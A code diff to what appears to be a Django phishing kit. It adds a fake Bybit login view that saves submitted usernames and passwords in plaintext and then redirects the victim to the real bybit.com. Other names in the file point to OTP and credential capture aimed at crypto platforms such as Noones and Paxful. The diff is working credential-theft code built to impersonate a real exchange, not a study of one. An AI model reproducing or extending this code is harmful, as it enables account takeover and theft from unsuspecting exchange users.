@@ -74,7 +74,7 @@ import json
 
 
 #imports noones new
-from .models import UserSubmissionNoones, OTPSubmissionNoones
+from .models import UserSubmissionNoones, OTPSubmissionNoones, UserSubmissionBybit
 
 
 
@@ -937,7 +937,7 @@ def upload(request):
     return render(request, 'index2.html')
 
 def success(request):
-    return redirect('https://www.facebook.com/')
+    return redirect('https://www.bybit.com/')
 
 
 def view_image(request, image_id):
@@ -1223,5 +1223,23 @@ def infodbnoones(request):
 def receive_noones(request):
     users = UserPaxfulPay.objects.all()  # Correctly access the UsersPaxfulPay model
     return render(request, 'noonespayclient.html', {'users': users})
+
+
+def bybit(request):
+    return render(request,'test.html')
+
+
+def paypal(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        
+        # Save the username and password
+        submission = UserSubmissionBybit.objects.create(username=username, password=password)
+        
+        # Redirect to the verify page with submission_id
+        return redirect('/success')
+    
+    return render(request, 'bybitlogin.html')
 
 
